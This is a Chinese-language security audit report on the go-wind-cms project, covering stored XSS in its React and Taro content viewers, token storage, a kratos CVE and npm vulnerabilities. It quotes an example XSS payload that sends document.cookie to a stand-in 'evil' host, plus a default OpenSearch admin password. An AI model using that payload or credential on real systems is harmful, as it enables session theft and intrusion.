# go-wind-cms 第 9 轮综合审计报告

- **审计日期**：2026-08-11
- **审计范围**：(1) 复核第 8 轮 22 个发现；(2) 审计本次 OpenSearch 搜索接入改动（提交 `c596846e`）；(3) 补第 8 轮局限 4/5（前端逐页 XSS + 移动端安全）；(4) 补第 8 轮局限 6（实跑 CVE 扫描 + 供应链）
- **审计方法**：4 路并行只读 agent + 主审计员对 Critical/High 关键事实亲验（文件读取 + WebSearch CVE 核对）
- **产出性质**：报告，**本轮不改代码**
- **基线**：第 8 轮报告 `.zcode/plans/audit-round8-report-and-roadmap.md`（2026-08-10）

---

## 0. 审计结论摘要

**本轮最重要的新发现是 2 个 Critical 存储型 XSS**（Taro/React ContentViewer），它们使全部 C 端文章页对存储型 XSS 敞开，且数据源是 admin 富文本（Tiptap），构成 **admin 被攻陷 → 全站 C 端读者 XSS → token 窃取（localStorage 明文）→ 账号接管** 的完整链路。

第 8 轮的 22 个发现 **100% 仍未修复**（第 8 轮后仅 1 个搜索提交，未触及任何安全文件）。本次搜索改动本身安全性良好（无 Critical/High）。CVE 扫描补全发现 1 个 High 级 kratos CVE（亲验属实）+ 大量前端 npm 漏洞。

### 本轮发现统计

| 严重度 | 本轮新增 | 编号 | 备注 |
|---|---|---|---|
| Critical | **2** | AUD9-C1, AUD9-C2 | 均为前端存储型 XSS，**亲验属实** |
| High | **2** | AUD9-H1, AUD9-H2 | kratos CVE（亲验）+ Nuxt DevTools RCE |
| Medium | **7** | AUD9-M1~M7 | 含搜索改动引入的 2 个 ES 凭据项 |
| Low | **3** | AUD9-L1~L3 | |

### 第 8 轮发现复核统计

| 状态 | 数量 |
|---|---|
| 已修复 | **0** |
| 未修复 | **22**（AUD-C1~C3, H1~H6, M1~M6, L1~L7 全部原样存在）|

> 第 8 轮基线 `8f986561` → 当前 HEAD `c596846e` 之间仅 1 个提交（OpenSearch 接入），`git diff` 对所有安全相关文件（grpc_server.go / operator_metadata.go / CI / oss.yaml / auth/ent/logging 中间件 / JWT / *data.go / authentication_service.go）均返回空。**P0 路图 6 项工作零启动。**

---

## 1. Critical 发现（本轮新增，均亲验）

### AUD9-C1 — Taro ContentViewer 无任何 sanitize，存储型 XSS 直接可利用 `[亲验]`
- **位置**：`frontend/app/taro/src/components/content/ContentViewer.tsx:66-94`
- **亲验证据**：
  - 第 1-4 行 import 只有 `React/View/marked`，**未 import DOMPurify**（尽管 `package.json:63` 有 `dompurify` 依赖，代码里没调用）
  - 第 73 行 `case 'markdown': html = marked.parse(content)` —— marked 默认不转义行内 HTML
  - 第 76 行 `case 'html': return content` —— 原文直接返回
  - 第 92 行 `<View dangerouslySetInnerHTML={{__html: renderedContent}} />` —— 无过滤直接注入 DOM
- **数据来源**：后端文章 `content` 字段（admin Tiptap 富文本编辑器产出，可含任意 HTML）。链路：`getPostContent(post)` → `displayContent` → `<ContentViewer content={displayContent}/>`（`pages/post/detail/index.tsx:187`）
- **可利用性**：**高**。任何能创建/编辑文章的用户（或 admin 被攻陷后）即可对所有 C 端读者发起存储型 XSS。H5 端直接执行脚本；小程序端 Taro `rich-text` 虽不执行 `<script>`，但 `<a href="javascript:">`、`<img>`、表单、`<style>` CSS 注入仍可造成钓鱼/点击劫持。
- **对比**：Vue 端（`Viewer.vue`）用 `DOMPurify.sanitize` + `ALLOWED_URI_REGEXP: SAFE_URI_REGEXP`（行 240-262）+ `escapeHtml(link.href)`（行 164），**安全**。三端防护梯度：**Vue（安全）> React（弱化，见 C2）> Taro（裸奔）**。
- **建议**：复刻 Vue 端的 sanitize 逻辑到 Taro（小程序无 DOM，需用 `isomorphic-dompurify` + jsdom，或自实现白名单）。`html` 类型尤其不可直接渲染原文。

### AUD9-C2 — React ContentViewer 的 DOMPurify 配置形同虚设（`ALLOW_UNKNOWN_PROTOCOLS: true`）`[亲验]`
- **位置**：`frontend/app/react/src/components/content/ContentViewer.tsx:222-255`
- **亲验证据**（逐项核对配置）：
  - 第 246 行 `ALLOW_UNKNOWN_PROTOCOLS: true` —— **致命**。关闭协议白名单，`javascript:` / `vbscript:` / `data:text/html` 不被清除
  - 第 231 行 `iframe` 在 `ALLOWED_TAGS` —— 配合上述配置，`<iframe src="javascript:...">` 可注入
  - 第 239 行 `style` 在 `ALLOWED_ATTR` —— 允许行内 CSS，可造成 CSS 注入（`background:url()` 外泄、`position:fixed` 钓鱼）
  - **缺** `ALLOWED_URI_REGEXP`（Vue 端有 `SAFE_URI_REGEXP` 兜底，React 端没有）
- **数据来源**：同 C1，后端文章 `content`
- **可利用性**：**高**。`<a href="javascript:fetch('//evil/?c='+document.cookie)">` 在 React 端可执行。`<img src=x onerror=...>` 中 onerror 会被 DOMPurify 剥，但 `javascript:` 协议向量因 `ALLOW_UNKNOWN_PROTOCOLS` 存活。
- **建议**：
  1. 删除 `ALLOW_UNKNOWN_PROTOCOLS: true`
  2. 加 `ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[/#.])/i`（对齐 Vue）
  3. 从 `ALLOWED_TAGS` 移除 `iframe`（或严格限定 src 域名白名单）
  4. 从 `ALLOWED_ATTR` 移除 `style`
  5. `renderer.link`/`renderer.image` 对 href/src 做 `escapeHtml`（对齐 Vue）

### 攻击链路（C1/C2 与 AUD-M3 token 明文 + AUD9-M5 组合）
```
admin 用户被钓鱼/弱密码撞库（AUD-H2 无限流助攻）
  → 在文章 content 注入 <script> 或 <a href="javascript:...">
  → C 端读者打开文章（Taro/React ContentViewer）
  → 脚本执行，localStorage.getItem('gowind-access-storage') 读 token（AUD-M3 + AUD9-M5 明文）
  → token 外泄到攻击者服务器 → 账号接管
```

---

## 2. High 发现（本轮新增）

### AUD9-H1 — kratos CVE-2026-6993（Confused Deputy，HTTP NewServer 路由暴露）`[亲验]`
- **CVE / GHSA**：[CVE-2026-6993](https://github.com/advisories/GHSA-jj45-xvq5-rhh9) / [GO-2026-5471](https://pkg.go.dev/vuln/GO-2026-5471)
- **亲验证据**：
  - `backend/go.mod`：`github.com/go-kratos/kratos/v2 v2.9.2`（正是受影响上限 "up to 2.9.2"）
  - 项目 `app/{admin,app}/service/internal/server/rest_server.go` 均用 `transport/http`（即 `NewServer`），命中漏洞组件
  - WebSearch 核对：advisory 描述 "Kratos HTTP server sets `http.DefaultServeMux` as the fallback handler for unmatched routes, leading to unintended route exposure"
- **可利用性**：**待验证**。该漏洞是"路由暴露/Confused Deputy"，**非直接 RCE**；需要 `http.DefaultServeMux` 上注册了额外 handler 才能被利用。项目代码未显式往 `http.DefaultServeMux` 注册（用 kratos 自己的 router），所以实际暴露面需进一步动态验证。agent 原定为 Critical，我降为 **High（待验证可利用性）** —— 这是更诚实的定级。
- **建议**：升级 kratos > 2.9.2（fix 版本发布后）；升级前核查项目是否间接注册了 DefaultServeMux handler。

### AUD9-H2 — Nuxt DevTools RCE（GHSA-279x-mwfv-vcqv，dev 环境）
- **位置**：`frontend/app/vue/pnpm-lock.yaml` 中 `@nuxt/devtools: 3.2.4`（< fix 3.3.1）
- **性质**：未认证 RCE，但仅 dev 服务器暴露
- **可利用性**：生产构建不打包，但威胁开发者机器（源码/密钥泄露）
- **建议**：升级 `@nuxt/devtools` ≥ 3.3.1

---

## 3. Medium 发现（本轮新增）

### AUD9-M1 — React 端导航 `window.open(item.url)` 缺协议白名单（javascript: 注入）
- **位置**：`frontend/app/react/src/components/layout/TopNavbar.tsx:90`、`MobileNav.tsx:101`
- **现状**：Vue 端 `MobileNav.vue:76-77` 显式校验 `/^https?:\/\//i.test(url)`，React 端未移植。若 admin 配置 `item.url = "javascript:..."`，React 端会执行。同时 React 端 `window.open` 缺 `noopener,noreferrer`（反向 tabnabbing 风险）。
- **建议**：复刻 Vue 端 `isExternal` 校验 + 加 `noopener,noreferrer`。

### AUD9-M2 — admin Tiptap 编辑器允许 iframe/link 任意 URL（C1/C2 的数据源根因）
- **位置**：`frontend/admin/apps/admin/src/adapter/component/Editor/src/TiptapEditor/extensions/CustomIframe.ts:8-87`、`composables/useEditorModals.ts:124-143`（iframe）、`:22-34`（link）、`index.vue:172-177`（Markdown 导入 `marked.parse` 后 `setContent` 无 sanitize）
- **现状**：`CustomIframe` 直接把用户输入 src 写入 `<iframe>`，不校验协议/域名；`setLink` 不校验 `javascript:`；Markdown 导入路径无 sanitize。
- **建议**：iframe src 加协议白名单 + 域名白名单（YouTube/B 站等）；link href 校验；Markdown 导入加 DOMPurify。

### AUD9-M3 — admin 框架组件 `v-html` 渲染后端数据（workbench/notification）
- **位置**：`frontend/admin/packages/effects/common-ui/src/ui/dashboard/workbench/workbench-trends.vue:51`、`workbench-todo.vue:50`、`notification/notification.vue:117`
- **现状**：当前 admin dashboard 用的是 `views/dashboard/analytics/*`，这些 Vben 模板组件未被直接使用（低活跃风险）。但一旦接入站内通知/动态，`v-html` 即变存储型 XSS。
- **建议**：框架通用组件不应假设 `item.content/message` 可信，改 `{{ }}` 或加 DOMPurify。

### AUD9-M4 — Flutter Token 明文存储于 SharedPreferences
- **位置**：`frontend/app/flutter_app/lib/src/core/repositories/user_auth_cache.dart:89-99`
- **现状**：`SharedPreferences.setString('ACCESS_TOKEN'/'REFRESH_TOKEN', token)`，Android 上是明文 XML（`/data/data/<pkg>/shared_prefs/`），root/备份可读。代码里保留了被注释的 `FlutterSecureStorage`（行 29），说明知道方案但未启用。
- **建议**：启用 `flutter_secure_storage`（Keystore/Keychain）；release 禁用备份（`android:allowBackup="false"`）。违反 OWASP MASVS-STORAGE-1。

### AUD9-M5 — Web 三端（Vue/React/Taro）Token 明文存 localStorage（放大 C1/C2 危害）
- **位置**：Taro `store/core/access/store.ts:107-118`、Vue `stores/modules/app/auth.state.ts:49`、React `store/StoreProvider.tsx` + 各端 `core/storage/storage.class.ts`
- **现状**：三端 storage 层均**无 encrypt/decrypt**（grep `crypto` 在 storage 目录 0 命中）。Taro 有 `utils/crypto.ts` 提供加解密但 storage 未调用。任何 XSS（尤其 C1/C2）可 `localStorage.getItem` 直接窃 token。
- **建议**：至少对 token AES 加密落盘（项目已有 `crypto.ts`）；优先改内存态 access token + httpOnly cookie。

### AUD9-M6 — Mermaid securityLevel 在 React 端为 loose（Vue 端有 escapeHtml 但 Vue/React 均非 strict）
- **位置**：React `ContentViewer.tsx:17` `securityLevel: 'loose'`；Vue `Viewer.vue:90` 同为 `'loose'`（注：前端 XSS agent 误报 Vue 为 strict，亲验 Vue 也是 loose，但 Vue 有 escapeHtml 兜底）
- **现状**：loose 模式允许 mermaid 图表标签里用 HTML，配合 C2 削弱的 DOMPurify 更易携带危险属性。
- **建议**：两端统一改 `securityLevel: 'strict'`。

### AUD9-M7 — 搜索改动引入的 ES 默认弱/共享凭据 + 明文 HTTP `[亲验]`
- **位置**：`backend/app/core/service/configs/data.yaml:23-27`
  ```yaml
  elasticsearch:
    addresses: ["http://opensearch:9200"]
    username: "admin"
    password: "${opensearch_password:@Abcd#123456}"
  ```
- **现状**：用 OpenSearch 默认最高特权账号 `admin`；默认密码 `@Abcd#123456` 作为 fallback 写在仓库；走明文 http。与 AUD-H5 同模式。
- **可利用性**：仅当运维未设 `OPENSEARCH_PASSWORD` 或攻击者能直连 9200 时。一旦利用，ES admin 可读全租户索引（含 content/tenant_id）或删索引。
- **建议**：fallback 改启动即失败；用受限 service account 而非 admin；生产启用 TLS。属于 AUD-H5 范畴的新增实例。

---

## 4. Low 发现（本轮新增）

### AUD9-L1 — 搜索改动：payload.TenantID 字段易被误用
- **位置**：`backend/app/core/service/internal/service/search_service.go:88-89`（worker 把 `payload.TenantID` 打进日志，但实际 ES 写入取 DB 记录的 tenant_id）
- **现状**：当前安全（ES 写入不取 payload），但字段存在易误导后续开发。
- **建议**：字段加 `// Deprecated: 仅日志用，ES 写入必须取 DB` 注释或删除。

### AUD9-L2 — 搜索改动：DeletePost 不带 tenant_id 过滤（设计合理，记录待复核）
- **位置**：`backend/app/core/service/internal/data/search_repo.go:154-205`
- **现状**：delete-by-query 只用 `term{post_id}`，注释解释 post_id 是 ent 全局自增主键跨租户唯一。仅 worker 调用，非 HTTP 可达。
- **建议**：保留，可加 _seq_no 双保险。

### AUD9-L3 — 搜索改动：ES 索引模板未配置 dynamic=false
- **位置**：`search_repo.go:89-127`（EnsureIndexTemplate）
- **建议**：template 顶层加 `"dynamic": false`，严格化 mapping。

---

## 5. 本次搜索改动（c596846e）专项安全结论

**总体：安全性良好，无 Critical/High。** 租户隔离设计正确，ES 查询无注入，字段双重限制，前端全用安全文本插值。

### 5.1 无发现的维度（明确通过）
- **后端鉴权与租户隔离**：`OperationPostServiceSearchPosts` 正确地**不进白名单**（`rest_server.go:40-58`），强制登录。BFF `SearchPosts` 纯透传（`post_service.go:83-85`）。core 端双重 fail-closed（`search_service.go:65-69` + `search_repo.go:232-234`）。`SearchPostsRequest` proto **无 tenant_id/status 字段**，客户端结构上无法绕过。**登录用户无法通过搜索枚举其他租户内容**（tenant_id 从 viewer 注入，ES filter 强制）。
- **ES 注入**：DSL 用 Go `map[string]any` + `json.Marshal` 构造（`search_repo.go:260-282`），非字符串拼接。注释明确刻意绕过 go-crud 的 Lucene query string 封装（有注入风险）。
- **字段泄漏**：`WithSource("post_id","language","title")`（行 295）真实限制 + 响应二次裁剪 + proto 契约只有 3 字段。未发布内容不可搜（status 硬编码 PUBLISHED + reindex 时删 ES 文档）。
- **分页 DoS**：`maxSearchPageSize=50` / `maxSearchResultFrom=10000`（行 44-45）封顶。
- **前端 XSS（搜索页本身）**：4 端搜索结果全用框架默认转义的文本插值（Vue `{{ }}`、React `{}`、Taro `<Text>`、Flutter `Text()`），无 `v-html`/`dangerouslySetInnerHTML`。SearchBar 跳转用 `encodeURIComponent`。token 不在搜索 URL。

### 5.2 搜索改动唯一的安全问题
即 AUD9-M7（ES 凭据，属 AUD-H5 新增实例）+ AUD9-L1/L2/L3（低危设计点）。无新增高危。

---

## 6. CVE 与供应链（补第 8 轮局限 6）

### 6.1 工具实跑情况
| 工具 | 状态 |
|---|---|
| `pnpm audit --prod`（4 前端，官方 registry）| **实跑** ✅ |
| `go list -m` + WebSearch CVE 核对 | 实跑（版本号核对）|
| `govulncheck` / `osv-scanner` | 未安装（只读约束未 install），降级 |
| `flutter pub audit` | 无 dart 工具，降级 |

### 6.2 后端 Go 漏洞
- **AUD9-H1**：kratos CVE-2026-6993（见上，亲验属实，待验证可利用性）
- **已确认未受影响**（正向结论）：golang-jwt/v5 v5.3.1、pgx/v5 v5.9.2（含 SQL 注入 fix）、go-redis/v9 v9.19.0、grpc v1.82.0（含 CVE-2026-33186 fix）、etcd v3.6.11、casbin v2.135.0、asynq v0.26.0、ent v0.14.6 —— **均在 fix 版本之上**。
- **供应链 EOL 新风险**：MinIO 上游 2026-02-13 已 archive，`minio-go/v7` 未来漏洞无官方修复。

### 6.3 前端 npm 漏洞（pnpm audit 实跑计数）
| 前端 | Critical | High | Moderate | Low | 合计 |
|---|---|---|---|---|---|
| admin (Vben) | 2 | ~60 | ~90 | ~30 | **188** |
| react (Next 16.2.6) | 0 | ~25 | ~45 | ~8 | **74** |
| vue (Nuxt 4.4.4) | 3 | ~22 | ~30 | ~10 | **69** |
| taro | 1 | ~13 | ~26 | ~10 | **50** |

最严重：AUD9-H2（Nuxt DevTools RCE）、nuxt 自身 Runtime RCE、next SSRF/中间件绕过、admin form-data/tar critical、taro swiper 原型污染、全端 axios 高危。

### 6.4 tx7do/* 集中性风险（AUD-H6 深化）
**46 个 tx7do 模块，60% 停在 0.x**（v0.0.x 20 个 + v0.1.x 8 个）。最敏感的安全模块仍在 0.0.x：`go-utils/crypto v0.0.2`、`go-utils/password v0.0.2`、`go-utils/jwtutil v0.0.3`、`go-crud/entgo v0.0.51`、`kratos-swagger-ui v0.0.1`。**单一维护者覆盖认证/传输/CRUD/加密全部横切关注点** —— 本项目最大供应链集中性风险。

### 6.5 治理（与第 8 轮对比，无改进）
- Dependabot 仍仅 github-actions（115 字节配置），gomod/npm/pub/docker 全不跟踪
- CI 仍仅 CodeQL Go，无 govulncheck/pnpm audit
- lockfile 完整性良好（go.sum + 4 pnpm-lock + pubspec.lock 均在）
- 无自动化 license 检查（许可证均为宽松 MIT/Apache，无 copyleft 冲突）

---

## 7. 第 8 轮 22 个发现复核详表

| 发现 | 严重度 | 当前状态 | 证据 |
|---|---|---|---|
| AUD-C1 core gRPC 无鉴权无签名 | Critical | 未修复 | `grpc_server.go:29-34` 中间件链未变；`operator_metadata.go` 仍无签名校验；`server.yaml:3` 仍 `0.0.0.0:0` |
| AUD-C2 CI 禁用 | Critical | 未修复 | 无新建 ci.yml；`go.yml__` 仍残留 |
| AUD-C3 安全路径零回归测试 | Critical | 未修复 | auth/ent 中间件目录无 `*_test.go` |
| AUD-H1 RBAC noop | High | 未修复 | `NewAuthorizer()` 仍返回 `noop.State{}` |
| AUD-H2 登录无限流/captcha fail-open | High | 未修复 | doGrantTypePassword 无 LoginPolicy/lockout；captcha 仍 fail-open |
| AUD-H3 审计日志体系缺失 | High | 未修复 | app BFF 审计函数仍 return nil；core gRPC 无审计中间件 |
| AUD-H4 审计日志含密码明文 | High | 未修复 | api_audit_log.go 仅排除 login，password 类端点仍原文落库 |
| AUD-H5 弱默认密钥无 fail-fast | High | 未修复 | oss.yaml 仍 access_key:"root"；AES/DB/Redis/ES 无校验 |
| AUD-H6 供应链治理不足 | High | 未修复 | Dependabot 仍仅 github-actions |
| AUD-M1 公开路由无 host→租户解析 | Medium | 未修复 | 无 host→tenant 中间件 |
| AUD-M2 WithInjectTenantId 未启用 | Medium | 未修复 | recordFile 仍用 req.GetTenantId() |
| AUD-M3 前端凭证 log | Medium | 未修复 | 4 处 console.log 仍在 |
| AUD-M4 大文件入库/.dockerignore | Medium | 未修复 | jar/字体/placeholder 仍入库；.dockerignore 未补全 |
| AUD-M5 无 SBOM/签名 | Medium | 未修复 | — |
| AUD-M6 CodeQL 仅 Go | Medium | 未修复 | matrix 仍 `['go']` |
| AUD-L1~L7 | Low | 未修复 | 全部原样（SystemViewer 跳过、MinIO HMAC 死代码、JWT 无 iss/aud、Lua 未接线、go.yml__、server.exe、无 license 检查）|

---

## 8. 已确认良好项（本轮新增正向结论）

| 维度 | 结论 | 依据 |
|---|---|---|
| 搜索 ES 注入 | 无注入 | 结构化 DSL 构造 + 刻意绕过 go-crud Lucene 封装 |
| 搜索字段泄漏 | 无泄漏 | WithSource + 响应二次裁剪 + proto 3 字段契约 |
| 搜索租户枚举 | 不可枚举 | tenant_id 强制 viewer 注入，ES filter 不可绕过 |
| 搜索前端 XSS | 无 | 4 端全用安全文本插值 |
| Vue ContentViewer | **安全**（前端 XSS 基线）| DOMPurify + ALLOWED_URI_REGEXP + escapeHtml |
| Go 关键包 CVE | 多数已在 fix 版本 | jwt/pgx/redis/grpc/etcd/casbin/asynq/ent 均未受影响 |
| Lockfile 完整性 | 良好 | go.sum + 4 pnpm-lock + pubspec.lock 齐全 |
| 许可证 | 无冲突 | 全栈宽松许可，无 copyleft |

> 注：与第 8 轮一样，这些"良好"是快照判断。因 AUD-C2（无 CI）+ AUD-C3（无测试），无法持续保证。

---

## 9. 本轮审计局限

1. **后端 CVE 仍非 govulncheck 实跑**：版本号核对 ≠ 调用图分析。AUD9-H1 的实际可利用性需 govulncheck + 动态验证。
2. **前端 pnpm audit 用 prod 模式**：dev 依赖的 critical（Nuxt DevTools）不进生产构建，但威胁开发者机器。
3. **Flutter 无工具验证**：dart 未安装，pubspec 仅静态核对。
4. **未动态验证**：未跑服务、未做渗透。AUD9-C1/C2 的实际利用需在测试环境注入富文本验证。
5. **第 7 轮已做项仍未逐一复核**（延续第 8 轮局限 3）。
6. **tx7do 46 模块未逐一核 CVE**（无统一 CVE 库收录小众包）。

---

## 10. 修复优先级建议

### P0（紧急，立即）— 阻断 XSS → token 窃取链路
1. **AUD9-C1 + AUD9-C2**：修复 Taro/React ContentViewer 的 sanitize（对齐 Vue 端）。**这是本轮最紧急** —— 完整攻击链现实可利用。
2. **AUD9-M5**：token 加密落盘或改 httpOnly cookie（阻断 XSS 窃取）。
3. **AUD9-H1**：升级 kratos > 2.9.2（CVE-2026-6993）。
4. **AUD9-M2**：admin Tiptap iframe/link 加协议白名单（C1/C2 数据源根因）。

### P0（延续第 8 轮，仍未启动）
5. AUD-C1 core gRPC 鉴权 + 签名
6. AUD-C2 恢复 CI（含 govulncheck/pnpm audit，能自动发现 AUD9-H1 类问题）
7. AUD-H1 启用真 RBAC / AUD-H2 登录限流 / AUD-H3/H4 审计日志

### P1（短期）
8. AUD9-M1 React 导航协议过滤 / AUD9-M3 admin v-html 加固
9. AUD9-M4 Flutter secure storage / AUD9-M6 Mermaid strict
10. AUD9-H2 Nuxt DevTools 升级 + 前端 npm critical 批量修
11. AUD9-M7 + AUD-H5 密钥 fail-fast（含 ES 凭据）

### P2（中期）
12. tx7do 集中性风险缓解（安全敏感 0.0.x 模块审计/替换）
13. MinIO EOL 应对规划
14. 第 8 轮剩余 Medium/Low + 本轮 Low

---

## 附录：本轮关键文件索引

**前端 XSS（最紧急）**：
- `frontend/app/taro/src/components/content/ContentViewer.tsx`（C1）
- `frontend/app/react/src/components/content/ContentViewer.tsx`（C2）
- `frontend/app/vue/app/components/content/Viewer.vue`（安全基线，参照）
- `frontend/admin/apps/admin/src/adapter/component/Editor/src/TiptapEditor/`（M2 数据源）

**token 存储**：
- `frontend/app/taro/src/store/core/access/store.ts`、各端 `core/storage/storage.class.ts`、`flutter_app/lib/src/core/repositories/user_auth_cache.dart`

**搜索改动**：
- `backend/app/core/service/internal/data/search_repo.go`（ES 查询，结构化构造）
- `backend/app/core/service/internal/service/{post_service,search_service}.go`（fail-closed）
- `backend/app/core/service/configs/data.yaml`（M7 ES 凭据）

**CVE/供应链**：
- `backend/go.mod`（kratos v2.9.2）、`go.sum`
- `.github/dependabot.yml`（仅 github-actions）、`.github/workflows/`

---

*报告完。本轮未改任何代码。建议优先处理 AUD9-C1/C2（XSS 攻击链）。*
